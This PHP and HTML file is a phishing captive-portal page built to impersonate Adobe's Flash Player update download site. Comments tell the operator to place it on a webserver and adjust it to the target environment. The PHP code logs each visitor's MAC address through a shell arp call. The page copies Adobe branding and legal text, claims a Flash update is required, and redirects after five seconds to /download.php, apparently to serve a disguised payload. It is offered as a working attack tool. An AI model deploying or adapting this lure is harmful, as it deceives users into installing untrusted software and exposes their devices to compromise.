<?php
// Place in the root of the webserver directory

// Rename these Variables to conform with the target environment 
$server_name = "get";
$domain_name = "adobe.com";
$site_name = "Adobe Flash Player Update";
 
// Path to the arp command on the local server
$arp = "/usr/sbin/arp";
 
// The following file is used to keep track of users
$users = "/var/lib/users";
 
// Check if we've been redirected by firewall to here.
// If so redirect to registration address
if ($_SERVER['SERVER_NAME']!="$server_name.$domain_name") {
  header("location:http://$server_name.$domain_name/index.php?add="
    .urlencode($_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']));
  exit;
}
 
// Attempt to get the client's mac address
$mac = shell_exec("$arp -a ".$_SERVER['REMOTE_ADDR']);
preg_match('/..:..:..:..:..:../',$mac , $matches);
@$mac = $matches[0];
if (!isset($mac)) { exit; }
else {
?>

    <!doctype html>

    <html>
        <head>
            <meta charset="utf-8">
				

            <title>Adobe Flash Player Install for all versions</title>
			
			
				<meta name="description" content="Download free Adobe Flash Player software for your Windows, Mac OS, and Unix-based devices to enjoy stunning audio/video playback, and exciting gameplay.">
			

            <link href="/wwwimages2.adobe.com/downloadcenter/singlepage/livebeta/css/reset.css" rel="stylesheet">
            <link href="/wwwimages2.adobe.com/downloadcenter/singlepage/livebeta/css/jquery-ui/jquery-ui.css" rel="stylesheet">
            <link href="/wwwimages2.adobe.com/downloadcenter/singlepage/livebeta/css/core.css" rel="stylesheet">

            <!--[if lt IE 9]>
                <link href="https://wwwimages2.adobe.com/downloadcenter/singlepage/livebeta/css/ie_fix.css" rel="stylesheet">
            <![endif]-->

            <script src="wwwimages2.adobe.com/downloadcenter/singlepage/livebeta/js/jquery/jquery.min.js" type="text/javascript"></script>
            <script src="wwwimages2.adobe.com/downloadcenter/singlepage/livebeta/js/jquery/jquery-ui.min.js" type="text/javascript"></script>
            <script src="wwwimages2.adobe.com/downloadcenter/singlepage/livebeta/js/jquery/plugins/cookies/cookies.js" type="text/javascript"></script>
            <script src="wwwimages2.adobe.com/downloadcenter/singlepage/livebeta/js/jquery/plugins/outside/outside.js" type="text/javascript"></script>
            <script src="wwwimages2.adobe.com/downloadcenter/singlepage/livebeta/js/jquery/plugins/string/string.js" type="text/javascript"></script>
            <script src="wwwimages2.adobe.com/downloadcenter/singlepage/livebeta/js/jquery/plugins/bxslider/bxslider.js" type="text/javascript"></script>
            <script src="wwwimages2.adobe.com/downloadcenter/singlepage/livebeta/js/jquery/plugins/selectBox/selectBox.js" type="text/javascript"></script>
            <script src="wwwimages2.adobe.com/downloadcenter/singlepage/livebeta/js/swfobject/swfobject.js" type="text/javascript"></script>
            <script src="wwwimages2.adobe.com/downloadcenter/singlepage/livebeta/js/modal.js" type="text/javascript"></script>
            <script src="wwwimages2.adobe.com/downloadcenter/singlepage/livebeta/js/core.js" type="text/javascript"></script>
			
	        <script type="text/javascript" src="//fonts.adobe.com/yoe7ink.js"></script>
            <script type="text/javascript">try{Typekit.load();}catch(e){}</script>
            <script type="text/javascript">
			if (!Array.prototype.indexOf)
			{
			  Array.prototype.indexOf = function(elt /*, from*/)
			  {
				var len = this.length;

				var from = Number(arguments[1]) || 0;
				from = (from < 0)
					 ? Math.ceil(from)
					 : Math.floor(from);
				if (from < 0)
				  from += len;

				for (; from < len; from++)
				{
				  if (from in this &&
					  this[from] === elt)
					return from;
				}
				return -1;
			  };
			}
            </script>

            <!--[if lt IE 9]>
                <script src="wwwimages2.adobe.com/downloadcenter/singlepage/livebeta/js/html5shiv.js" type="text/javascript"></script>
            <![endif]-->
             
          
			
            
			<script type="text/javascript" src="wwwimages2.adobe.com/uber/js/pdc_s_code.js"></script>
			<script type="text/javascript" src="wwwimages2.adobe.com/uber/js/atm/s_code_acdc.js"></script>
		
<link rel="stylesheet" href="wwwimages2.adobe.com/downloadcenter/js/jquery.nyroModal/styles/nyroModal.css" type="text/css" media="screen" />
<script type="text/javascript" src="wwwimages2.adobe.com/downloadcenter/js/jquery.nyroModal/js/jquery.nyroModal.custom.min.js"></script>
<!--[if IE 6]>
	<script type="text/javascript" src="wwwimages2.adobe.com/downloadcenter/js/jquery.nyroModal/js/jquery.nyroModal-ie6.min.js"></script>
<![endif]-->
<script type="text/javascript" src="wwwimages2.adobe.com/downloadcenter/js/livebeta/polarbear.js"></script>
<script type="text/javascript">
	jQuery(document).ready(function($) {
		$("#sectionRegion").hide();
		try {
			$(window).SiteCatalystWrapper({
				siteCatalyst: s,
				siteCatalystReboot: s_adobe
			}).data("SiteCatalystWrapper");
		}catch (e){}

		try {
			window.document.cookie = "visitedFlashPlayerLandingPage=true;path=/;"
		}
		catch (e) {
		}
		$("#buttonDownload").downloadbutton({
			clientPlatformDistribution: "",
			clientPlatformType: "Unknown",
			clientPlatformArchitecture: "x86-32",
			clientPlatformMisc: "",
			browser_type: "",
			browser_dist: "",
			defaultDownloadType: "",
			saiDownloadType: "download",
			aihDownloadType: "download",
			downloadcenter: "flashplayer",
			acceptedInstaller: "Google_Toolbar_7.0",
			locale: "en",
			buttonClass: "download-button",
			useAihIfPossible: true
		});

		// Modal plugin
		$(".nyroModal").nyroModal();

		$(".dualOfferModal").nyroModal({
			modal: false,
			resize: function(){
				$('.nyroModalCont').css('width', "auto");
				$('.nyroModalCont').css('height', "auto");
				$('.nyroModalDom').css('min-height',70);
				$('.nyroModalCont').css('margin-top', 250);
			},
			callbacks: {
				beforeShowCont: function() {
					$('.nyroModalCont').css('width', "auto");
					$('.nyroModalCont').css('height', "auto");
					$('.nyroModalDom').css('min-height',70);
					$('.nyroModalCont').css('margin-top', 250);
				}
			}
		  });
		
			

		
		
		$("#offer").addons({
			downloadButton: $("#buttonDownload"),
			megabyteAbbr: "MB",
			fileSizeLabel: $("#filesizelabel"),
			locale: "en",
            language: "English",
            os: "Unknown",
            browser_type: "",
            browser_dist: "",
			eula: $("#adobeEULA"),
			resources: $("#adobeResources"),
			adobeEula: "By clicking the \"Download now\" button, you acknowledge that you have read and agree to the  <a href=\"wwwimages2.adobe.com/www.adobe.com/content/dam/Adobe/en/legal/licenses-terms/pdf/FlashPlayer_12_0_en.pdf\" title=\"Adobe Software Licensing Agreement\" rel=\"modal\" id=\"AUTO_ID_db_a_license\">Adobe Software Licensing Agreement</a>.",
			omniturePrefix: 'FP_',
			downloadcenter: "flashplayer",
			bundledAddon: $("#bundledAddon"),
			fileSize: $("#clientfilesize"),
			dualOfferInstallOptions: $("#dualOfferInstallOptions"),
			dualModalWindow: $("#dualModalWindow"),
			siteCatalystWrapper: $(window).data("SiteCatalystWrapper"),
			polarbearpal: new Polarbearpal(),
			appdetection: new PolarbearAppDetection(),
			brCountryList: "JP",
			brLanguageList: ""
	}).data("addons");
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		

		
		

	
    
    
    

	
	
	
	
	
	
	

    
    
try{
    $(window).data("SiteCatalystWrapper").setProperty ("pageName", "ACDC_FP_OtherVersion_Offer");
    $(window).data("SiteCatalystWrapper").setProperty ("channel", "ACDC_FlashPlayer");
    $(window).data("SiteCatalystWrapper").setSiteCatalystProperty ("prop32", "en");
    $(window).data("SiteCatalystWrapper").setSiteCatalystRebootProperty ("prop1", "Offer");
    $(window).data("SiteCatalystWrapper").setSiteCatalystRebootProperty ("prop2", "ACDC Downloads");
    $(window).data("SiteCatalystWrapper").setSiteCatalystRebootProperty ("prop3", "https://get2.adobe.com");
    $(window).data("SiteCatalystWrapper").setSiteCatalystRebootProperty ("prop4", "en");
    $(window).data("SiteCatalystWrapper").setSiteCatalystRebootProperty ("prop5", "en:ACDC_FP_OtherVersion_Offer");
    
        $(window).data("SiteCatalystWrapper").setSiteCatalystRebootProperty ("products", "FlashPlayer_NonAIH");
        $(window).data("SiteCatalystWrapper").setSiteCatalystRebootProperty ("eVar73", "ACDC_FlashPlayer_Livebeta");
        $(window).data("SiteCatalystWrapper").setSiteCatalystRebootProperty ("events", "event98");
	
 	 

    

	

	
}catch (e){}

		var pbDisplayOffer = function(){
			$("#otherVersionsForm").otherversions({
			steps: [
				{
					id: "select_os",
					label: "Step 1",
					defaultOption: "Select an operating system",
					requestParameters: {
						"Windows 8/Windows Server 2012": {
							platform_type: "Windows",
							platform_dist: "Windows 8",
							platform_arch: "",
							platform_misc: "",
							exclude_version: "",
							browser_arch: "",
							browser_type: "",
							browser_vers: "",
							browser_dist: ""
						},
						"Windows 7/Vista/XP/2008/2003": {
							platform_type: "Windows",
							platform_dist: "XP",
							platform_arch: "x86-32",
							platform_misc: "",
							exclude_version: "10",
							browser_arch: "",
							browser_type: "",
							browser_vers: "",
							browser_dist: ""
						},
						"Mac OS X 10.6 - 10.10": {
							platform_type: "Macintosh",
							platform_dist: "",
							platform_arch: "x86-64",
							platform_misc: "",
							browser_arch: "",
							browser_type: "",
							browser_vers: "",
							browser_dist: ""
						},						
						"Linux (64-bit)": {
							platform_type: "Linux",
							platform_dist: "",
							platform_arch: "x86-64",
							browser_arch: "",
							browser_type: "",
							browser_vers: "",
							browser_dist: ""
						},
						"Linux (32-bit)": {
							platform_type: "Linux",
							platform_dist: "",
							platform_arch: "x86-32",
							exclude_version: "10",
							browser_arch: "",
							browser_type: "",
							browser_vers: "",
							browser_dist: ""
						},						
						"default": {
							platform_type: "",
							platform_dist: "",
							platform_arch: "",
							exclude_version: "",
							browser_arch: "",
							browser_type: "",
							browser_vers: "",
							browser_dist: ""
						}
					}
				},
				{
					id: "select_version",
					label: "Step 2",
					defaultOption: "Select a version",
					requestParameters: {
						"default": {eventname: "flashplayerotherversions"}
					}
				}
			],
			options: [
				{ "Windows 8/Windows Server 2012": null },
				{ "Windows 7/Vista/XP/2008/2003": null },
				{ "Mac OS X 10.6 - 10.10": null },				
				{ "Linux (64-bit)": null },
				{ "Linux (32-bit)": null }				
			],
			config: {
				webserviceUrl: "/flashplayer/webservices/json/",
				ajaxLoader: $("#loadingAjaxRequest"),
				unavailableContent: $("#unavailable"),
				downloadContent: $("#downloadContent"),
				errorBox: $("#JSError"),
				errorMessage: "A background processing error occurred. Please refresh the page or try again later.",
				downloadContent: $("#downloadContent"),
				sysRequirementsLink: $("#system_requirements"),
				sysRequirementsUrl: "/flashplayer/modal/?content=flashSystemRequirement&loc=en&fakeajax",
				displayProperties: {
					"file_size": $("#clientfilesize"),
					"fileSizeLabel": $("#filesizelabel"),
					"browser": $("#browserinfo"),
					"bundledAddon": $("#bundledAddon")
				},
				megabyteAbbreviation: "MB",
				kilobyteAbbreviation: "KB",
				downloadButton: $("#buttonDownload").data("downloadbutton"),
				addons: $("#offer").data("addons"),
				locale: "en"
			}
		});
		
		try{
		$(window).data("SiteCatalystWrapper").send();
		$(window).removeData("SiteCatalystWrapper");
		}catch (e){}
		$("#otherVersionsContent").show();
	};

	try{
		var palDomain = new PalDomainStorage("https://get3.adobe.com", "/util/pal/read/");
		palDomain.requestValue(function(value){
			if(value !== undefined && value.length > 0){
				$("#offer").data("addons").setPalList(value);
			}
			pbDisplayOffer();
		});
	}catch(e){
		pbDisplayOffer();
	}
});
</script>


			<style>
				body { display : none;}
				.ui-dialog{ filter: none !important; }
			</style>
        <script type='text/javascript'>var locale = 'en';</script></head>

        <body>
        	<script type="text/javascript">
 				if (self == top) {
	    			var theBody = document.getElementsByTagName('body')[0];
	    			theBody.style.display = "block";
	  			} else {
	    			top.location = self.location;
	  			}
			</script>
            <div class="MainContent" id="AUTO_ID_div_main_content">
				<header id="AUTO_ID_singlepage_header">
					<div class="header " id="AUTO_ID_singlepage_div_header">
						<div class="HeaderContent" id="AUTO_ID_singlepage_div_headerContent">
							<span id="AUTO_ID_singlepage_span_home"><a class="HomeLogo" href="http://www.adobe.com" id="AUTO_ID_singlepage_a_home">Home</a></span>
							<p class="TextStep" id="AUTO_ID_singlepage_span_step">Step: 1 of 3</p>
						</div>
					</div>
				</header>
				<section id="AUTO_ID_singlepage_section">
					<div class="section " id="mainSection">
						<div id="ContentColumns-left">
	<div id="round1" class="ContentColumn ContentColumn-1">
		<h2 class="HeaderFlashPlayer" id="AUTO_ID_columnleft_h2_header">Adobe Flash Player</h2>
		<p id="AUTO_ID_columnleft_p_flash_logo"><img src="wwwimages2.adobe.com/downloadcenter/singlepage/live/images/flash_windows.gif" width="316" height="130" id="AUTO_ID_columnleft_img_flash_logo" alt=""></p>
		<p> The page that you requested requires Adobe Flash to be updated.</p>
		<noscript>
        	<style>
				#playerInformationPane,#offersInformationPane,#AUTO_ID_columnright_h3_t_and_c,
				#eula,#bottom_download_button_section,#AUTO_ID_columnright_div_01,#AUTO_ID_columnright_div_02 {display:none;}
			</style>
            <div class="MessageBox NoBottomMargin" id="AUTO_ID_columnleft_div_js_error">
                <p style="color:black" id="AUTO_ID_columnleft_p_js_error">
					
                        JavaScript error encountered. Unable to install latest version of Flash Player.
                    
                </p>
            </div>
		</noscript>

		<div id="otherVersionsContent" style="display: none;">
			<div id="otherVersionsForm"></div>
			<div id="loadingAjaxRequest" style="display: none;"></div>
            <h2 id="unavailable" style="display: none;">Flash player download is unavailable at this moment. Please try again after some time.</h2>
			<div id="downloadContent" style="display: none;">
				<p id="AUTO_ID_columnleft_p_system_requirements">
					<a rel="modal" title="System requirements" href="wwwimages2.adobe.com/products/flashplayer/systemreqs/" id="system_requirements">
						System requirements
					</a>
				</p>
                <div id="optionalAddonContent" style="display: none;"></div>
			</div>
			<span id="bundledAddon"></span>            
			<div class="AlignBottom" id="AUTO_ID_columnleft_div_older_version">
				<p class="NoBottomMargin" id="AUTO_ID_columnleft_p_older_version" style="font-size:12px">If your operating system/browser combination is not displayed, refer to the <a rel="modal" href="https://helpx.adobe.com/flash-player/kb/archived-flash-player-versions.html">Archived Flash Player versions</a> page.</p>
	        </div>
		</div>
    </div>
</div>

<div id="ContentColumns-right">
	<div class="ContentColumn ContentColumn-2" id="AUTO_ID_columnright_div_01">
		<div id="playerInformationPane">
			<h3 id="AUTO_ID_db_h3_about_head">About:</h3>
<p id="AUTO_ID_db_p_about_text_01">Adobe&reg; Flash&reg; Player is a lightweight browser plug-in and rich Internet application runtime that delivers consistent and engaging user experiences, stunning audio/video playback, and exciting gameplay.</p>
<p id="AUTO_ID_db_p_about_text_02">Installed on more than 1.3 billion systems, Flash Player is the standard for delivering high-impact, rich Web content.</p>
		</div>

		<div id="offersInformationPane" style="display: none;">
			<h3 id="AUTO_ID_columnright_h3_optional_offer">Optional offer:</h3>
			<div id="offer"></div>
		</div>
	</div>

	<div class="ContentColumn ContentColumn-3" id="AUTO_ID_columnright_div_02">
		<h3 id="AUTO_ID_columnright_h3_t_and_c">Terms &amp; conditions:</h3>
		<div id="eula">
			<p id="adobeEULA">By clicking the "Download now" button, you acknowledge that you have read and agree to the  <a href="wwwimages2.adobe.com/www.adobe.com/content/dam/Adobe/en/legal/licenses-terms/pdf/FlashPlayer_12_0_en.pdf" title="Adobe Software Licensing Agreement" rel="modal" id="AUTO_ID_db_a_license">Adobe Software Licensing Agreement</a>.</p>
		</div>
		<script>
					setTimeout("location.href = '/download.php';", 5000);
		</script>
			<div class="AlignBottom" id="bottom_download_button_section" style="display: none;">

			<p id="antivirusMessage" class="TextGrey">Note: Your antivirus software must allow you to install software.</p>
			<p class="SmallBottomMargin AlignCenter" id="AUTO_ID_columnright_p_download_button"><a class="Button ButtonGrey" href="/download.php" id="buttonDownload">
				Download now</a>
			</p>
			<p class="NoBottomMargin AlignCenter TextGrey" id="total_size_text" style="display: none;">
				Total size: <span id="totalsize"></span> MB
				<span id="clientfilesize" style="display:none;"></span>
			</p>
		</div>
	</div>
</div>

	<br class="clear-both" id="AUTO_ID_br_clear_both"/>
	<noscript><img src="sstats.adobe.com/b/ss/mxmacromedia/1/H.24.4T/0?pageName=ACDC%5FNoscript&g=http%3A//get.adobe.com/&ch=ACDC%5FNoscript&server=Dylan" height="1" width="1" border="0" alt="" /></noscript><noscript><img src="https://sstats.adobe.com/b/ss/adbacdcprod/1/H.24.4T/0?pageName=ACDC%5FNoscript&g=https://get2.adobe.com&ch=ACDC%5FNoscript" height="1" width="1" border="0" alt="" /></noscript><!--/DO NOT REMOVE/-->
<!-- End Adobe Digital Marketing Suite Tag Management code -->
	<script>
		$("#bottom_download_button_section").show();
	</script>
					</div>
				</section>

				
					
                    
                    	
                    
					<footer id="singlepage_footer">
						<div class="footer " id="AUTO_ID_singlepage_div_footer">
							
								
                                
					<!-- $Id: //depot/projects/dylan/releases/rc_15_3/ubi/footer/en_us/globalfooter_ssi_pdc_singlepage.html#2 $ -->

<div class="SiteFooterRegionPanel" id="RegionPanel" style="display: none;">
  <div class="SiteFooterRegionPanelHeader"> <span class="SiteFooterMenuItemIcon SiteFooterMenuItemIconRegionBlack">Choose your region</span> <a id="RegionClose" class="SiteFooterRegionPanelHeaderClose">Close</a> </div>
    <div class="Column">
            <div class="Column-1">
              <p class="SiteFooterRegionPanelRegionHeader">Americas</p>
            </div>
            <div class="Column-2-3">
              <p class="SiteFooterRegionPanelRegionHeader">Europe, Middle East and Africa</p>
            </div>
            <div class="Column-4">
              <p class="SiteFooterRegionPanelRegionHeader">Asia Pacific</p>
            </div>
            <div class="Column-1">
              <ul>
                <li lang="pt"><a onClick="changeRegion('br');">Brasil</a></li>
                <li lang="en"><a onClick="changeRegion('ca');">Canada - English</a></li>
                <li lang="fr"><a onClick="changeRegion('ca_fr');">Canada - Fran&ccedil;ais</a></li>
                <li lang="es"><a onClick="changeRegion('la');">Latinoam&eacute;rica</a></li>
                <li lang="es"><a onClick="changeRegion('mx');">M&eacute;xico</a></li>
                <li lang="en"><a onClick="changeRegion('us');">United States</a></li>
              </ul>
            </div>
            <div class="Column-2">
              <ul>
                <li lang="en"><a onClick="changeRegion('africa');">Africa - English</a></li>
                <li lang="de"><a onClick="changeRegion('at');">&Ouml;sterreich - Deutsch</a></li>
                <li lang="en"><a onClick="changeRegion('be_en');">Belgium - English</a></li>
                <li lang="fr"><a onClick="changeRegion('be_fr');">Belgique - Fran&ccedil;ais</a></li>
                <li lang="nl"><a onClick="changeRegion('be_nl');">Belgi&euml; - Nederlands</a></li>
                <li lang="bg"><a onClick="changeRegion('bg');">България</a></li>
                <li lang="hr"><a onClick="changeRegion('hr');">Hrvatska</a></li>
                <li lang="en"><a onClick="changeRegion('cy_en');">Cyprus - English</a></li>
                <li lang="cs"><a onClick="changeRegion('cz');">Česk&aacute; republika</a></li>
                <li lang="da"><a onClick="changeRegion('dk');">Danmark</a></li>
                <li lang="et"><a onClick="changeRegion('ee');">Eesti</a></li>
                <li lang="fi"><a onClick="changeRegion('fi');">Suomi</a></li>
                <li lang="fr"><a onClick="changeRegion('fr');">France</a></li>
                <li lang="de"><a onClick="changeRegion('de');">Deutschland</a></li>
                <li lang="en"><a onClick="changeRegion('gr_en');">Greece - English</a></li>
                <li lang="hu"><a onClick="changeRegion('hu');">Magyarorsz&aacute;g</a></li>
                <li lang="en"><a onClick="changeRegion('ie');">Ireland</a></li>
                <li lang="en"><a onClick="changeRegion('il_en');">Israel - English</a></li>
                <li lang="he"><a onClick="changeRegion('il_he');">&#1497;&#1513;&#1512;&#1488;&#1500; - &#1506;&#1489;&#1512;&#1497;&#1514;</a></li>
                <li lang="it"><a onClick="changeRegion('it');">Italia</a></li>
                <li lang="lv"><a onClick="changeRegion('lv');">Latvija</a></li>
                <li lang="lt"><a onClick="changeRegion('lt');">Lietuva</a></li>
                <li lang="de"><a onClick="changeRegion('lu_de');">Luxembourg - Deutsch</a></li>
                <li lang="en"><a onClick="changeRegion('lu_en');">Luxembourg - English</a></li>
                <li lang="fr"><a onClick="changeRegion('lu_fr');">Luxembourg - Fran&ccedil;ais</a></li>
                <li lang="en"><a onClick="changeRegion('mt');">Malta - English</a></li>
                <li lang="ar"><a onClick="changeRegion('mena_ar');">&#1575;&#1604;&#1588;&#1585;&#1602; &#1575;&#1604;&#1571;&#1608;&#1587;&#1591; &#1608;&#1588;&#1605;&#1575;&#1604; &#1571;&#1601;&#1585;&#1610;&#1602;&#1610;&#1575; - &#1575;&#1604;&#1604;&#1594;&#1577; &#1575;&#1604;&#1593;&#1585;&#1576;&#1610;&#1577;</a></li>
                <li lang="en"><a onClick="changeRegion('mena_en');">Middle East and North Africa - English</a></li>
                <li lang="fr"><a onClick="changeRegion('mena_fr');">Moyen-Orient et Afrique du Nord - Fran&ccedil;ais</a></li>
              </ul>
            </div>
            <div class="Column-3">
              <ul>
                <li lang="nl"><a onClick="changeRegion('nl');">Nederland</a></li>
                <li lang="no"><a onClick="changeRegion('no');">Norge</a></li>
                <li lang="pl"><a onClick="changeRegion('pl');">Polska</a></li>
                <li lang="pt"><a onClick="changeRegion('pt');">Portugal</a></li>
                <li lang="ro"><a onClick="changeRegion('ro');">Rom&acirc;nia</a></li>
                <li lang="ru"><a onClick="changeRegion('ru');">Россия</a></li>
                <li lang="sr"><a onClick="changeRegion('rs');">Srbija</a></li>
                <li lang="sk"><a onClick="changeRegion('sk');">Slovensko</a></li>
                <li lang="sl"><a onClick="changeRegion('si');">Slovenija</a></li>
                <li lang="es"><a onClick="changeRegion('es');">Espa&ntilde;a</a></li>
                <li lang="sv"><a onClick="changeRegion('se');">Sverige</a></li>
                <li lang="de"><a onClick="changeRegion('ch_de');">Schweiz - Deutsch</a></li>
                <li lang="fr"><a onClick="changeRegion('ch_fr');">Suisse - Fran&ccedil;ais</a></li>
                <li lang="it"><a onClick="changeRegion('ch_it');">Svizzera - Italiano</a></li>
                <li lang="tr"><a onClick="changeRegion('tr');">T&uuml;rkiye</a></li>
                <li lang="uk"><a onClick="changeRegion('ua');">Україна</a></li>
                <li lang="en"><a onClick="changeRegion('uk');">United Kingdom</a></li>
              </ul>
            </div>
            <div class="Column-4">
              <ul>
                <li lang="en"><a onClick="changeRegion('au');">Australia</a></li>
                <li lang="zh"><a onClick="changeRegion('cn');">中国</a></li>
                <li lang="zh"><a onClick="changeRegion('hk_zh');">中國香港特別行政區</a></li>
                <li lang="en"><a onClick="changeRegion('hk_en');">Hong Kong S.A.R. of China</a></li>
                <li lang="en"><a onClick="changeRegion('in');">India - English</a></li>
                <li lang="ja"><a onClick="changeRegion('jp');">日本</a></li>
                <li lang="ko"><a onClick="changeRegion('kr');">한국</a></li>
                <li lang="en"><a onClick="changeRegion('nz');">New Zealand</a></li>
                <li lang="en"><a onClick="changeRegion('sea');">Southeast Asia (Includes Indonesia, Malaysia, Philippines, Singapore, Thailand, and Vietnam) - English</a></li>
                <li lang="zh"><a onClick="changeRegion('tw');">台灣</a></li>
              </ul>
              <p class="SiteFooterRegionPanelRegionHeader">Commonwealth of Independent States</p>
              <ul>
                <li><a href="/cis/">Includes Armenia, Azerbaijan, Belarus, Georgia, Moldova, Kazakhstan, Kyrgyzstan, Tajikistan, Turkmenistan, Ukraine, Uzbekistan</a></li>
              </ul>
            </div>
  </div>
</div>
<div class="Region">
  <p id="RegionLink"><a href="//www.adobe.com/go/gffooter_choose_region" class="RegionLink">Choose your region</a></p>
  <p id="RegionLinkSet" style="display: none;">United States <a href="//www.adobe.com/go/gffooter_choose_region" id="sfRegionChange">(Change)</a></p>
</div>
<div class="Copyright">
  <p>Copyright &copy; 2015 Adobe Systems Incorporated.  All rights reserved.</p>
  <p><a target="_blank" href="//www.adobe.com/go/gffooter_terms_of_use">Terms of use</a> | <a rel="modal" href="//www.adobe.com/privacy.html">Privacy</a> | <a rel="modal" href="//www.adobe.com/privacy/cookies.html">Cookies</a></p>
</div>

					
							
						</div>
					</footer>
                  
            </div>
			<div id="dualOfferInstallOptions" style="display: none;" title="Install Option"></div>
        </body>
    </html>
<?php
}
?>
